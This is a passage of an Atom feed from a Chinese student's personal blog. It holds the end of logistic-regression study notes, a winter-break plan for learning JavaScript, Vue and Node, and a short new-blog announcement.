({\theta_j}^{2})<br>$$<br>注意最后出现的：$λ\sum_{ j=1 }^{ m } ({\theta_j}^{2})$ 即正则项，它的存在意味着我们在优化时，不仅仅想让 <strong><em>J(θ)</em></strong> 尽可能小，同时也想保证 <strong><em>θ</em></strong> 也尽可能小,由此来减少过拟合。下面的图盗自网上，为取不同 <strong><em>λ</em></strong> 时训练后的决策边界：</p><p><img src="http://pnc8how9w.bkt.clouddn.com/image/Logistic%20Regression/4.svg" alt=""></p><p>可以看到，随着 λλ 的增加，决策边界越来越平滑，但同时决策边界的准确性下降了。这是因为 λλ 过大时，优化 J(θ)J(θ) 的主要目标变成了优化正则项而不是损失函数。</p><h4 id="2-偏置"><a href="#2-偏置" class="headerlink" title="2.偏置"></a>2.偏置</h4><p>即为手工加上偏置项 <code>1</code> ，例如两维样本 [x1,x2][x1,x2] 就需要扩充成 [1,x1,x2][1,x1,x2]，这个 <code>1</code> 就是所谓的偏置项。这样训练出来的 θθ 就会比维度多一。这多的一维的作用是让拟合的直线可以不经过原点，即多了ax+b中的b项，从而可以表示任意直线。</p><p><img src="http://pnc8how9w.bkt.clouddn.com/image/Logistic%20Regression/6.svg" alt=""></p><h4 id="3-特征缩放"><a href="#3-特征缩放" class="headerlink" title="3.特征缩放"></a>3.特征缩放</h4><p>经常的，数据的各个特征的尺度不同，而如果差异很大，则会影响训练模型的速度。因此在训练前我们常常需要把各个特征缩放到同一尺度上。我的理解，这步类似层次分析法中的归一化，用来奖不用尺度的变量对结果的影响尺度变得相近，不同的是这里是为了提升速度。下图是用梯度下降法训练上节数据的学习曲线，可以看到差别相当明显。</p><p><img src="http://pnc8how9w.bkt.clouddn.com/image/Logistic%20Regression/5.svg" alt=""></p><p>最终流程大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">初始化线性函数参数为1</span><br><span class="line">构造关于线性函数的sigmoid函数</span><br><span class="line">重复循环i次</span><br><span class="line">计算数据集梯度</span><br><span class="line">更新线性函数参数</span><br><span class="line">确定最终的sigmoid函数</span><br><span class="line">输入训练（测试）数据集</span><br><span class="line">运用最终sigmoid函数求解分类</span><br></pre></td></tr></table></figure></p><hr><h3 id="在机器人评估中的应用："><a href="#在机器人评估中的应用：" class="headerlink" title="在机器人评估中的应用："></a>在机器人评估中的应用：</h3><p>也许逻辑回归可以做为新的评估方法，因为它的本质用途是用于解决二分类（0 or 1）问题,它用于估计某种事物的可能性。比如某用户购买某商品的可能性，某病人患有某种疾病的可能性，以及某广告被用户点击的可能性等。它通过判断决定因素与结果（比如说这个队伍很强）的相关度来得出可能性。如果评估中用来判断决定因素与队伍强弱的关系，那么就可以判别出这个队伍的实际水平。</p><h4 id="1-数据"><a href="#1-数据" class="headerlink" title="1.数据"></a><strong>1.数据</strong></h4><p>所需数据如下：<br>(1).输入变量为一场比赛的控球率、射门成功率、推进效率、防守成功率。比赛的比分差大于某个值，这y=1，否则y=0。<br>(2).包含以上所需值的足够量的场次数据，或者每份为10分钟，需足够份数。</p><h4 id="2-使用numpy编写脚本"><a href="#2-使用numpy编写脚本" class="headerlink" title="2.使用numpy编写脚本"></a><strong>2.使用numpy编写脚本</strong></h4><h4 id="3-数据处理后输入，获得输出"><a href="#3-数据处理后输入，获得输出" class="headerlink" title="3.数据处理后输入，获得输出"></a><strong>3.数据处理后输入，获得输出</strong></h4><h4 id="4-获得的一组输出-θ-即为所需值"><a href="#4-获得的一组输出-θ-即为所需值" class="headerlink" title="4.获得的一组输出 *θ* 即为所需值"></a><strong>4.获得的一组输出 *</strong>θ<strong>* 即为所需值</strong></h4><p><a href="https://github.com/ShadowGlint/ML-Basic-Code/blob/master/Logistic%20Regression.py" target="_blank" rel="noopener">代码</a></p><p><strong>参考链接：</strong><br><a href="https://zhuanlan.zhihu.com/p/28408516" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28408516</a><br><a href="https://lotabout.me/2018/Logistic-Regression-Notes/" target="_blank" rel="noopener">https://lotabout.me/2018/Logistic-Regression-Notes/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;  &lt;/p&gt;
&lt;h2 id=&quot;知识补充：&quot;&gt;&lt;a href=&quot;#知识补充：&quot; class=&quot;headerlink&quot; title=&quot;知识补充：&quot;&gt;&lt;/a&gt;知识补充：&lt;/h2&gt;&lt;h4 id=&quot;1-假设函数（Hypothesis-function）&quot;&gt;&lt;a href=&quot;#1-假设函数（Hypothesis-function）&quot; class=&quot;headerlink&quot; title=&quot;1.假设函数（Hypothesis function）&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.假设函数（Hypothesis function）&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;首先我们要先介绍一下Sigmoid函数，也称为逻辑函数（Logistic function）：&lt;/p&gt;
&lt;p&gt;$$&lt;br&gt;g(z)= \frac{1}{1+e^{-z}}&lt;br&gt;$$&lt;br&gt;Sigmoid函数曲线如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/8400344-b2ea6e9143565516.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;Sigmoid&quot;&gt;&lt;/p&gt;
&lt;p&gt;从上图可以看到sigmoid函数是一个s形的曲线，它的取值在[0, 1]之间，在远离0的地方函数的值会很快接近0或者1。它的这个特性对于解决二分类问题十分重要&lt;/p&gt;
&lt;p&gt;接下来将该假设函数与逻辑回归结合：&lt;/p&gt;
&lt;p&gt;$$&lt;br&gt;h_\theta(x) = g(\theta^T x), g(z)= \frac{1}{1+e^{-z}}&lt;br&gt;$$&lt;br&gt;其中 &lt;strong&gt;&lt;em&gt;x&lt;/em&gt;&lt;/strong&gt; 是我们的输入，向量 &lt;strong&gt;&lt;em&gt;θ&lt;/em&gt;&lt;/strong&gt;  为我们要求取的参数。&lt;br&gt;
    
    </summary>
    
    
      <category term="Machine Learning Basic" scheme="http://love-sg.me/tags/Machine-Learning-Basic/"/>
    
  </entry>
  
  <entry>
    <title>寒假计划</title>
    <link href="http://love-sg.me/2018/12/29/%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92/"/>
    <id>http://love-sg.me/2018/12/29/寒假计划/</id>
    <published>2018-12-28T17:13:26.000Z</published>
    <updated>2019-01-04T09:51:24.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念.."></a>碎碎念..</h2><p>大二上学期划了一学期水。。。很多很硬的数理通修课都很恶心,虽然画了很多时间复习，效果还是一如既往地查…下学期坚决不会在复习上花大把时间！哭。。</p><p>寒假开始，不能这么闲鱼了，要补一下落下的东西。。后端有一些基础了，前端还是太差，那就假期恶补一下前端吧！</p><h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><p><strong>1.时间：1月15–2月25</strong></p><p><strong>2.任务范围：前端为主</strong></p><p><strong>3.任务涉及内容：js&amp;jquery基础、node、vue，angularjs可选</strong></p><p><strong>4.学习笔记：本地写markdown或者更新到在线文档，多交流进度知识点等</strong><br><a id="more"></a></p><h2 id="具体如下"><a href="#具体如下" class="headerlink" title="具体如下"></a>具体如下</h2><h4 id="1-首先复习是js和jquery基础，计划时间是5-7天，1月15-1月20"><a href="#1-首先复习是js和jquery基础，计划时间是5-7天，1月15-1月20" class="headerlink" title="1. 首先复习是js和jquery基础，计划时间是5-7天，1月15-1月20"></a><strong>1. 首先复习是js和jquery基础，计划时间是5-7天，1月15-1月20</strong></h4><p>学到什么程度呢，给一篇文章：<code>https://zhuanlan.zhihu.com/p/25602482</code></p><p><strong>资料：</strong>（资料部分只是顺手一查比较出名的，学习过程中遇到好的文章一定记得加上！）<br>(1). <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000" target="_blank" rel="noopener">廖雪峰，先跳过node等部分 </a><br>(2). <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/JavaScript_basic" target="_blank" rel="noopener">MDN</a><br>(3). 菜鸟</p><p><strong>过程中：</strong><br>教程中有的代码要跟着敲一遍，再注意看一下基本的跨域操作等开发常用技能，基本语法各种语言都类似看一下带过就行。然后有时间精力去看一下xss平台中各模块的代码以及常用一些操作payload，加深一下安全中js的运用理解。</p><p><strong>js基本语法是框架等一切的基础，就好比原生php于php框架，所以给7天，基础一定打牢！学习后期也要定时多看原生js</strong></p><h4 id="2-纠结了一下先学vue还是node，最终铁心先vue吧-毕竟前端太弱了，先好好弄弄前端-2333"><a href="#2-纠结了一下先学vue还是node，最终铁心先vue吧-毕竟前端太弱了，先好好弄弄前端-2333" class="headerlink" title="2. 纠结了一下先学vue还是node，最终铁心先vue吧 毕竟前端太弱了，先好好弄弄前端 2333"></a><strong>2. 纠结了一下先学vue还是node，最终铁心先vue吧 毕竟前端太弱了，先好好弄弄前端 2333</strong></h4><p>时间 1月21-2月4，共15天</p><p><strong>资料：</strong><br>(1). <a href="http://www.runoob.com/vue2/vue-tutorial.html" target="_blank" rel="noopener">菜鸟</a><br>(2). <a href="https://cn.vuejs.org/v2/guide/index.html" target="_blank" rel="noopener">文档</a><br>(3). <a href="https://github.com/liangxiaojuan/vue-todos" target="_blank" rel="noopener">不错的小实例</a></p><p><strong>注意:</strong> 我的理解，学vue并不是为了前端开发，而是vue资料多，而且上手容易，想快速提高前端知识，毕竟我是个安全工程师，而且是菜的一批的那种，所以vue只要会用，能基本看懂就行。学vue最主要的原因还是理解下前端框架的思路和能更好的熟悉前端的一些问题</p><h4 id="3-node，后端不多说，越熟越好"><a href="#3-node，后端不多说，越熟越好" class="headerlink" title="3. node，后端不多说，越熟越好"></a><strong>3. node，后端不多说，越熟越好</strong></h4><p>时间 2月5-2月19，共15天 剩下的时间自己补补落下的或者其他的事</p><p><code>https://juejin.im/entry/5987aaa6f265da3e3678c1a3</code></p><p><strong>资料：</strong><br>(1). <a href="http://www.runoob.com/nodejs/nodejs-tutorial.html" target="_blank" rel="noopener">菜鸟</a><br>(2). <a href="https://www.nodebeginner.org/index-zh-cn.html" target="_blank" rel="noopener">node入门</a><br>(3). 廖雪峰也稍微提及了node，可以看下<br>(4). <a href="https://nodejs.org/zh-cn/docs/" target="_blank" rel="noopener">文档</a></p><p><strong>node算是后端了，所以要好好看，熟悉写的cms的整体架构等，可能不急于写熟，但一定要能读能审，其他的慢慢来</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;碎碎念&quot;&gt;&lt;a href=&quot;#碎碎念&quot; class=&quot;headerlink&quot; title=&quot;碎碎念..&quot;&gt;&lt;/a&gt;碎碎念..&lt;/h2&gt;&lt;p&gt;大二上学期划了一学期水。。。很多很硬的数理通修课都很恶心,虽然画了很多时间复习，效果还是一如既往地查…下学期坚决不会在复习上花大把时间！哭。。&lt;/p&gt;
&lt;p&gt;寒假开始，不能这么闲鱼了，要补一下落下的东西。。后端有一些基础了，前端还是太差，那就假期恶补一下前端吧！&lt;/p&gt;
&lt;h2 id=&quot;计划&quot;&gt;&lt;a href=&quot;#计划&quot; class=&quot;headerlink&quot; title=&quot;计划&quot;&gt;&lt;/a&gt;计划&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.时间：1月15–2月25&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.任务范围：前端为主&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.任务涉及内容：js&amp;amp;jquery基础、node、vue，angularjs可选&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.学习笔记：本地写markdown或者更新到在线文档，多交流进度知识点等&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="立志不倒的flags" scheme="http://love-sg.me/tags/%E7%AB%8B%E5%BF%97%E4%B8%8D%E5%80%92%E7%9A%84flags/"/>
    
  </entry>
  
  <entry>
    <title>lfy&#39;s new blog</title>
    <link href="http://love-sg.me/2018/12/21/lfy-s-new-blog/"/>
    <id>http://love-sg.me/2018/12/21/lfy-s-new-blog/</id>
    <published>2018-12-21T07:43:37.000Z</published>
    <updated>2018-12-21T16:08:50.542Z</updated>
    
    <content type="html"><![CDATA[<p>一直说要用自己写的博客…然而实在太难用了，还是hexo吧</p><p>之前写了两个blog，php版和flask版，功能还算全，前端很丑 –&gt;<a href="https://github.com/ShadowGlint/two-blog-for-practice" target="_blank" rel="noopener">欢迎star</a>&lt;–</p><p>博客主要更新自己写的文章，包括各种笔记、wp等，欢迎大佬们交换友链:)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直说要用自己写的博客…然而实在太难用了，还是hexo吧&lt;/p&gt;
&lt;p&gt;之前写了两个blog，php版和flask版，功能还算全，前端很丑 –&amp;gt;&lt;a href=&quot;https://github.com/ShadowGlint/two-blog-for-practice&quot;
      
    
    </summary>
    
    
      <category term="碎碎念" scheme="http://love-sg.me/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
</feed>
